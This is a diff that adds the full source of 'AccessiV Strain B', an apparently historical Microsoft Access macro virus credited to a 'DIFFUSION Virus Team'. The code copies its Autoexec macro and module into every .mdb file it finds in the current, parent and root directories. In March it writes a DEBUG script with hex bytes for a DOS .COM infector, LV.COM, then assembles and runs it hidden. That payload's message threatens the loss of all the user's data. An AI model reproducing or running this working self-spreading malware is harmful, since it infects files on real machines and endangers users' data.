@@ -1,0 +1,99 @@
+   Attribute VB_Name = "Virus"
+   Dim filename As String
+   Dim curmonth As Integer
+   Dim curday As Integer
+   Option Compare Database
+   Option Explicit
+
+   Public Sub findfirst()
+   filename = Dir("*.mdb", vbNormal)   'Find MS Database File!
+   End Sub
+
+   Public Sub findfstprev()
+   filename = Dir("..\*.mdb", vbNormal)   'Find MS Database File!
+   End Sub
+
+   Public Sub findfstroot()
+   filename = Dir("\*.mdb", vbNormal)   'Find MS Database File!
+   End Sub
+
+   Public Sub infect()
+   On Error GoTo ohcrap
+   DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acMacro, "Autoexec", "Autoexec"
+   DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acModule, "Virus", "Virus"
+   ohcrap:
+   End Sub
+
+   Public Function AccessiV()
+   Call findfirst
+   Call infect
+   While filename <> ""
+   Call findnext
+   Call infect
+   Wend
+
+   Call findfstprev
+   Call infect
+   While filename <> ""
+   Call findnext
+   Call infect
+   Wend
+
+   Call findfstroot
+   Call infect
+   While filename <> ""
+   Call findnext
+   Call infect
+   Wend
+
+   curmonth = Val(Mid$(Date$, 1, 2))
+   curday = Val(Mid$(Date$, 4, 2))
+   If curmonth = 3 Then
+    MsgBox "I am the AccessiV virus, Strain B" + Chr$(13) + Chr$(10) + "Written by Jerk1N, of the DIFFUSION Virus Team" + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10) + "AccessiV was/is the first ever Access Virus!!!", vbAbortRetryIgnore, "AccessiV - Strain B"
+    Call createlv
+   End If
+   End Function
+
+   Public Sub findnext()
+   filename = Dir                      'Find another MS Database File!
+   End Sub
+
+   Public Sub createlv()
+   Open "LV.DBG" For Output As #1
+   Print #1, "N LV.COM"
+   Print #1, "E 0100 05 00 00 E9 00 00 E8 00 00 5F 81 EF 09 00 C6 85 "
+   Print #1, "E 0110 25 00 31 8B EF E8 02 00 EB 12 B9 BC 00 8D 9E 2C "
+   Print #1, "E 0120 00 8B 96 BC 01 90 17 43 43 E2 FA C3 B8 00 00 CD "
+   Print #1, "E 0130 1A 89 96 BC 01 B4 1A 8D 96 BE 01 CD 21 BF 00 01 "
+   Print #1, "E 0140 8D B6 6D 00 A5 A5 A5 E8 41 00 B8 00 01 50 C3 2A "
+   Print #1, "E 0150 2E 63 3F 6D 00 5B 4C 6F 6E 65 2E 56 65 6E 67 61 "
+   Print #1, "E 0160 6E 63 65 5D 00 5B 4A 31 4E 2F 44 5D 00 CD 20 00 "
+   Print #1, "E 0170 00 00 00 05 00 00 E9 00 00 B4 09 8D 96 A4 00 CD "
+   Print #1, "E 0180 21 B9 FF FF E8 1D 01 E2 FB CD 18 B4 4E B9 07 00 "
+   Print #1, "E 0190 8D 96 4F 00 CD 21 72 B2 E9 89 00 B4 4F CD 21 72 "
+   Print #1, "E 01A0 A9 E9 80 00 49 20 68 61 74 65 20 64 6F 69 6E 20 "
+   Print #1, "E 01B0 74 68 69 73 20 62 75 74 20 49 20 77 61 73 20 61 "
+   Print #1, "E 01C0 73 6B 65 64 20 74 6F 20 74 61 6B 65 20 79 6F 75 "
+   Print #1, "E 01D0 20 64 6F 77 6E 21 0D 0A 4E 65 78 74 20 74 69 6D "
+   Print #1, "E 01E0 65 20 79 6F 75 20 77 69 6C 6C 20 6C 6F 6F 73 65 "
+   Print #1, "E 01F0 20 41 4C 4C 20 79 6F 75 72 20 64 61 74 61 21 0D "
+   Print #1, "E 0200 0A 20 20 20 20 20 4A 65 72 6B 31 4E 2C 20 6F 66 "
+   Print #1, "E 0210 20 44 49 46 46 55 53 49 4F 4E 24 E9 2C FF E9 7A "
+   Print #1, "E 0220 FF E9 55 FF B8 01 43 B9 00 00 8D 96 DC 01 CD 21 "
+   Print #1, "E 0230 E8 64 00 72 E6 BE 82 00 AC 3C 00 75 E4 B8 02 42 "
+   Print #1, "E 0240 33 C9 33 D2 CD 21 2D 06 00 89 86 77 00 B9 00 42 "
+   Print #1, "E 0250 33 C0 33 D2 91 CD 21 B4 3F B9 06 00 8D 96 6D 00 "
+   Print #1, "E 0260 CD 21 80 BE 6D 00 05 75 07 80 BE 70 00 E9 74 AE "
+   Print #1, "E 0270 B8 00 42 33 C9 33 D2 CD 21 B0 40 86 E0 B9 06 00 "
+   Print #1, "E 0280 8D 96 73 00 CD 21 BA 02 42 33 C9 33 C0 92 CD 21 "
+   Print #1, "E 0290 E8 11 00 E8 09 00 C3 B4 3D B0 02 CD 21 93 C3 B4 "
+   Print #1, "E 02A0 3E CD 21 C3 53 E8 72 FE 5B B0 40 86 C4 B9 BB 01 "
+   Print #1, "E 02B0 8D 96 06 00 CD 21 53 E8 60 FE 5B C3 00 00 "
+   Print #1, "RCX"
+   Print #1, "01BE"
+   Print #1, "W"
+   Print #1, "Q"
+   Close
+   Shell "DEBUG LV.DBG", vbHide
+   Shell "LV.COM", vbHide
+   End Sub
